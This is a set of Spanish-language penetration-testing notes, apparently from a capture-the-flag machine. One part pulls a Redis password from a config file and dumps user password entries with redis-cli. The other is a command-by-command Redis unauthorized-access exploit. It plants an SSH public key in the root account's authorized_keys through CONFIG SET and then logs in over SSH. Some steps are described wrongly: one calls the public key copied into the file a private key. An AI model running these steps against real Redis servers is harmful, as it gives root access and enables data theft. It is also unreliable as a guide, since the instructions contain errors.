# Extraer "requiredpass" para obtener contraseña de usuario.

En 'C:\Program Files\Redis\redis.windows.conf' podemos encontrar un campo 'requiredpass: kidvscat_yes_kidvscat'
Con la línea de comandos redis-cli:
redis-cli -a kidvscat_yes_kidvscat keys *		--> Obtendremos 'pk:urn:user:xxxxxx'
redis-cli -a kidvscat_yes_kidvscat get pk:urn:user:xxxxx 		--> Obtendremos 'EncryptedPassword: contraseña'


	
===========================================================================

# Unauthorized Access Vulnerability
Redis es una herramienta de estructura de datos de código abierto ampliamente popular que se puede utilizar como una base de datos distribuida en memoria, un intermediario de mensajes o una caché. 
Dado que está diseñado para ser accedido dentro de entornos confiables, no debe exponerse en Internet. Sin embargo, algunos Redis están vinculados a la interfaz pública e incluso no tienen protección de autenticación por contraseña.
Bajo ciertas condiciones, si Redis se ejecuta con la cuenta raíz (o ni siquiera), los atacantes pueden escribir un archivo de clave pública SSH en la cuenta raíz, iniciando sesión directamente en el servidor de la víctima a través de SSH. Esto puede permitir a los piratas informáticos obtener privilegios de servidor, eliminar o robar datos, o incluso conducir a una extorsión de cifrado, poniendo en grave peligro los servicios comerciales normales.

El flujo simplificado de este exploit es:

* Generaremos una clave privada y una clave pública para SSH en la máquina de destino más adelante. Ejecute el siguiente comando para generar claves SSH y deje la frase de contraseña vacía.
		`ssh-keygen -t rsa`
* A continuación, ingrese a la carpeta .ssh. Si es un usuario root, ingrese /.ssh, de lo contrario ~ / .ssh, luego copie la clave privada en temp.txt.
		`(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n")> temp.txt`
		
		![](https://miro.medium.com/max/829/0*kj5v1UOnDs4_1B-4.png)
		
* Vamos a utilizar redis-cli, la interfaz de línea de comandos de Redis, para enviar comandos a Redis y leer las respuestas enviadas por el servidor directamente en la terminal.
	Ejecute los siguientes comandos en la carpeta redis-3.2.11 / src. (O dependiendo de dónde estemos, siempre podemos especificar la ruta a los archivos que usamos)
		`cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key`
		
* Nos conectamos al servidor Redis:
		`redis-cli -h 10.10.10.237`
		
`CONFIG GET dir` 			# get your redis directory   
	\# In the output of above command "/home/xxxx/redis-3.2.11/src" is the directory where redis server is installed. 
`CONFIG SET dir /home/xxxx/.ssh`			 # set the backup location to the .ssh folder (or) 
`CONFIG SET dir /root/.ssh` 
`CONFIG SET dbfilename authorized\_keys` # lastly we back our data containing our "s-key" key-value pair up in the .ssh folder save

\# command: private key username@server IP  
`ssh -i id\_rsa username@203.137.255.255`
